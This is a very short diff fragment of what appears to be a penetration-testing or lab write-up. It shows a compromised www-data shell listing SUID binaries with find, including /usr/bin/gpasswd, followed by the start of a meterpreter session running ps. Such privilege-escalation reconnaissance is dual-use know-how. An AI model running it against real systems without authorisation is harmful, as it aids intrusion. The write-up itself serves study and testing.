 
 ```bash
 www-data@app:~/html$ find / -perm -u=s -ls 2>/dev/null
@@ -894,6 +1199,7 @@ find / -perm -u=s -ls 2>/dev/null
    518801     76 -rwsr-xr-x   1 root     root        75824 Mar 22  2019 /usr/bin/gpasswd
 www-data@app:~/html$ 
 ```
+
 
 ```bash
 meterpreter > ps
